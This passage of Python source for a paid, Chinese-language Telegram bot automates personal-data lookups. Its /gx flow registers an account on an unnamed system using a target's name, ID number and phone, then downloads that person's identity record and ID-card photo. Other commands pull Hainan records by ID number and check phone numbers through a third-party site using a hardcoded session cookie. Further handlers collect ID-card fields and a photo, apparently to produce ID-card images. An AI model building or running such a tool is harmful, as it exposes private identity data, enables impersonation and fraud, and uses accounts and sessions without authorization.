            return ConversationHandler.END

def gx_phone(update, context):
    if update.message.text and update.message.text.startswith('/'):
        context.user_data.clear()
        update.message.reply_text("⏹️ 已取消")
        return ConversationHandler.END
    phone = update.message.text.strip()
    if not phone.isdigit() or len(phone) != 11:
        update.message.reply_text("手机号必须是11位数字，请重新输入：")
        return GX_PHONE
    context.user_data['gx_phone'] = phone
    update.message.reply_text("⏳ 正在获取验证码图片...")
    session = context.user_data['gx_session']
    img_b64, uuid = gx_get_captcha(session)
    if not img_b64 or not uuid:
        update.message.reply_text("❌ 获取图形验证码失败，请稍后重试")
        context.user_data.clear()
        return ConversationHandler.END
    context.user_data['gx_uuid'] = uuid
    try:
        img_bytes = base64.b64decode(img_b64)
        update.message.reply_photo(photo=io.BytesIO(img_bytes), caption="请查看上方验证码并输入（不区分大小写）")
    except Exception as e:
        update.message.reply_text(f"❌ 发送验证码图片失败：{e}")
        context.user_data.clear()
        return ConversationHandler.END
    update.message.reply_text("请输入图形验证码：")
    return GX_CAPTCHA

def gx_captcha(update, context):
    if update.message.text and update.message.text.startswith('/'):
        context.user_data.clear()
        update.message.reply_text("⏹️ 已取消")
        return ConversationHandler.END
    captcha = update.message.text.strip().upper()
    if not captcha:
        update.message.reply_text("验证码不能为空，请重新输入：")
        return GX_CAPTCHA
    context.user_data['gx_captcha'] = captcha
    phone = context.user_data['gx_phone']
    uuid = context.user_data['gx_uuid']
    session = context.user_data['gx_session']
    update.message.reply_text("⏳ 正在发送短信验证码...")
    ok, msg = gx_send_sms(session, phone, captcha, uuid)
    if not ok:
        update.message.reply_text(f"❌ 发送短信失败：{msg}\n流程终止")
        context.user_data.clear()
        return ConversationHandler.END
    update.message.reply_text("✅ 短信已发送，请输入收到的6位数字验证码：")
    return GX_SMS

def gx_sms(update, context):
    if update.message.text and update.message.text.startswith('/'):
        context.user_data.clear()
        update.message.reply_text("⏹️ 已取消")
        return ConversationHandler.END
    sms_code = update.message.text.strip()
    if not sms_code.isdigit() or len(sms_code) != 6:
        update.message.reply_text("验证码必须是6位数字，请重新输入：")
        return GX_SMS
    name = context.user_data['gx_name']
    id_card = context.user_data['gx_id']
    phone = context.user_data['gx_phone']
    captcha = context.user_data['gx_captcha']
    session = context.user_data['gx_session']
    update.message.reply_text("⏳ 正在注册账号...")
    ok, msg = gx_register(session, phone, sms_code, captcha, name, id_card)
    if not ok:
        update.message.reply_text(f"❌ 注册失败：{msg}")
        context.user_data.clear()
        return ConversationHandler.END
    update.message.reply_text("✅ 注册成功！正在登录并查询信息...")
    ok2, msg2 = gx_login(session, id_card, GX_PASSWORD)
    if not ok2:
        update.message.reply_text(f"⚠️ 注册成功但登录失败：{msg2}，请稍后手动查询")
        context.user_data.clear()
        return ConversationHandler.END
    success, data = gx_query_photo(session, name, id_card)
    if success:
        item2 = data.get("item2", {})
        if item2:
            update.message.reply_text(gx_format_info(item2))
        else:
            update.message.reply_text("⚠️ 未获取到身份文字信息")
        file_id = data.get("item1")
        if file_id:
            img_data = gx_download_photo(session, file_id)
            if img_data:
                update.message.reply_photo(photo=io.BytesIO(img_data), caption="身份证照片")
            else:
                update.message.reply_text("⚠️ 照片下载失败")
    else:
        update.message.reply_text(f"❌ 查询失败：{data}")
    context.user_data.clear()
    return ConversationHandler.END

# ===== /hn 海南查询（已改1积分） =====
def hn(update, context):
    context.user_data.clear()
    args=context.args
    if not args:
        update.message.reply_text("❌ 格式错误\n正确格式：/hn <身份证号>")
        return
    id_card=args[0].strip()
    if len(id_card)!=18:
        update.message.reply_text("❌ 身份证号必须为18位")
        return
    uid=update.effective_user.id
    ok, msg = deduct_points(uid, HN_COST, "（海南查询）")
    if not ok:
        update.message.reply_text(f"❌ {msg}，当前积分: {get_user_stats(uid)['points']:.2f}")
        return
    update.message.reply_text(f"⏳ 正在查询海南系统...（已扣 {HN_COST} 积分）")
    success, result = query_id_card_sync(id_card)
    if success:
        context.bot.send_document(chat_id=update.effective_chat.id, document=io.BytesIO(result), filename=f"{id_card}.pdf", caption="✅ 查询成功")
    else:
        update.message.reply_text(f"❌ 查询失败：{result}")

# ===== /khzc 空号检测 =====
def khzc_start(update, context):
    context.user_data.clear()
    update.message.reply_text("请输入要检测的手机号（11位数字）：")
    return KHZC_PHONE

def khzc_phone(update, context):
    if update.message.text and update.message.text.startswith('/'):
        context.user_data.clear()
        update.message.reply_text("⏹️ 已取消")
        return ConversationHandler.END
    phone = update.message.text.strip()
    if not phone.isdigit() or len(phone) != 11:
        update.message.reply_text("❌ 手机号必须是11位数字，请重新输入：")
        return KHZC_PHONE
    
    uid = update.effective_user.id
    ok, msg = deduct_points(uid, KHZC_COST, "（空号检测）")
    if not ok:
        update.message.reply_text(f"❌ {msg}，当前积分: {get_user_stats(uid)['points']:.2f}")
        context.user_data.clear()
        return ConversationHandler.END
    
    update.message.reply_text(f"⏳ 正在查询（已扣 {KHZC_COST} 积分）...")
    try:
        url = "https://www.3yit.com/index.php?m=plugins&c=EmptyNumber&a=check"
        cookies = {
            "home_lang": "cn",
            "PHPSESSID": "kn18b4vaqllh3srpdqk49auhl6",
            "Hm_lvt_95f136af5904ae1da9651a0091906092": "1780236755",
            "Hm_lpvt_95f136af5904ae1da9651a0091906092": "1780236755",
            "HMACCOUNT": "B42DAD244EF4555A",
            "_aihecong_chat_address": "%7B%22city%22%3A%22%E5%8D%97%E5%AE%81%22%2C%22region%22%3A%22%E5%B9%BF%E8%A5%BF%22%2C%22country%22%3A%22%E4%B8%AD%E5%9B%BD%22%7D",
            "_aihecong_chat_visibility": "true",
        }
        headers = {
            "Host": "www.3yit.com",
            "Connection": "keep-alive",
            "sec-ch-ua-platform": "\"Linux\"",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)  Chrome/131.0.8200.28 Safari/537.36 VivoBrowser/6.0.0.6 DeviceType/tablet",
            "sec-ch-ua": "\"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "sec-ch-ua-mobile": "?0",
            "Accept": "*/*",
            "Origin": "https://www.3yit.com",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://www.3yit.com/emptynumber/",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
        }
        data = f"mobile={phone}&website="
        resp = requests.post(url, headers=headers, cookies=cookies, data=data, timeout=15)
        if resp.status_code == 200:
            result = resp.json()
            if result.get("code") == 1 and result.get("data"):
                data_info = result["data"]
                reply = (f"📱 手机号：{data_info.get('mobile', '未知')}\n"
                         f"📌 类型：{data_info.get('label', '未知')}\n"
                         f"📝 说明：{data_info.get('text', '无详细说明')}\n"
                         f"🔢 类型码：{data_info.get('type', '无')}")
                update.message.reply_text(reply)
            else:
                update.message.reply_text(f"❌ 查询失败：{result.get('msg', '未知错误')}")
        else:
            update.message.reply_text(f"❌ 请求失败，状态码：{resp.status_code}")
    except Exception as e:
        update.message.reply_text(f"❌ 异常：{e}")
    context.user_data.clear()
    return ConversationHandler.END

# ===== 主程序 =====
def main():
    global bot
    updater=Updater(BOT_TOKEN, request_kwargs={'read_timeout':60,'connect_timeout':30})
    bot=updater.bot
    dp=updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("hn", hn))
    dp.add_handler(CommandHandler("cx", cx))
    dp.add_handler(CommandHandler("qd", qd))
    dp.add_handler(CommandHandler("zs", zs))
    dp.add_handler(CommandHandler("cz", cz))
    dp.add_handler(CommandHandler("qk", qk))
    dp.add_handler(CommandHandler("rh", rh))
    dp.add_handler(CommandHandler("cancel", cancel))

    dp.add_handler(ConversationHandler(
        entry_points=[CommandHandler('okcz', okcz_start)],
        states={RECHARGE_AMOUNT: [MessageHandler(Filters.text, okcz_amount)]},
        fallbacks=[CommandHandler('cancel', cancel)],
        allow_reentry=True
    ))

    dp.add_handler(ConversationHandler(
        entry_points=[CommandHandler('sfz', sfz_start)],
        states={
            SFZ_NAME: [MessageHandler(Filters.text, sfz_name)],
            SFZ_ID: [MessageHandler(Filters.text, sfz_id)],
            SFZ_NATION: [MessageHandler(Filters.text, sfz_nation)],
            SFZ_ADDR: [MessageHandler(Filters.text, sfz_address)],
            SFZ_EXPIRY: [MessageHandler(Filters.text, sfz_expiry)],
            SFZ_PHOTO: [MessageHandler(Filters.photo, sfz_photo)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
        allow_reentry=True
    ))

    dp.add_handler(ConversationHandler(
        entry_points=[CommandHandler('plc', plc_start)],
        states={
            PLC_NAME: [MessageHandler(Filters.text, plc_name)],
            PLC_ID: [MessageHandler(Filters.text, plc_id)],
            PLC_ADDR_CONFIRM: [CallbackQueryHandler(plc_addr_confirm_callback, pattern='^(plc_addr_yes|plc_addr_no)$')],
            PLC_ADDR_MANUAL: [MessageHandler(Filters.text, plc_addr_manual)],
            PLC_PHOTO: [MessageHandler(Filters.photo, plc_photo)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
        allow_reentry=True
    ))

    dp.add_handler(ConversationHandler(
        entry_points=[CommandHandler('qf', qf_start)],
        states={QF_QQ: [MessageHandler(Filters.text, qf_qq)]},
        fallbacks=[CommandHandler('cancel', cancel)],
        allow_reentry=True
    ))

    dp.add_handler(ConversationHandler(
        entry_points=[CommandHandler('2ys', ys_start)],
        states={
            YS_NAME: [MessageHandler(Filters.text, ys_name)],
            YS_ID: [MessageHandler(Filters.text, ys_id)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
        allow_reentry=True
    ))

    # ---------- 新增：/3ys 三要素核验 ----------
    dp.add_handler(ConversationHandler(
        entry_points=[CommandHandler('3ys', three_start)],
        states={
            THREE_NAME: [MessageHandler(Filters.text & ~Filters.command, three_name)],
            THREE_PHONE: [MessageHandler(Filters.text & ~Filters.command, three_phone)],
            THREE_ID: [MessageHandler(Filters.text & ~Filters.command, three_id)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
        allow_reentry=True
    ))

    dp.add_handler(ConversationHandler(
        entry_points=[CommandHandler('sms', sms_start)],
        states={
            SMS_CHOICE: [
                CallbackQueryHandler(sms_choice_callback, pattern='^sms_'),
                MessageHandler(Filters.text & ~Filters.command, sms_phone_input)
            ]
        },
        fallbacks=[CommandHandler('cancel', cancel)],
        allow_reentry=True
    ))

    dp.add_handler(ConversationHandler(
        entry_points=[CommandHandler('gx', gx_start)],
        states={
            GX_NAME: [MessageHandler(Filters.text & ~Filters.command, gx_name)],
            GX_ID: [MessageHandler(Filters.text & ~Filters.command, gx_id)],
            GX_PHONE: [MessageHandler(Filters.text & ~Filters.command, gx_phone)],
            GX_CAPTCHA: [MessageHandler(Filters.text & ~Filters.command, gx_captcha)],
            GX_SMS: [MessageHandler(Filters.text & ~Filters.command, gx_sms)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
        allow_reentry=True
    ))

    dp.add_handler(ConversationHandler(
        entry_points=[CommandHandler('khzc', khzc_start)],
        states={KHZC_PHONE: [MessageHandler(Filters.text & ~Filters.command, khzc_phone)]},
        fallbacks=[CommandHandler('cancel', cancel)],
        allow_reentry=True
    ))

    threading.Thread(target=check_orders, daemon=True).start()
    threading.Thread(target=run_flask, daemon=True).start()

    print("🔄 开始轮询 Telegram 服务器...")
    updater.start_polling()
    print("✅ 机器人已进入运行状态，等待消息...")
    updater.idle()
    print("⏹️ 机器人已停止")

if __name__ == "__main__":
    main()
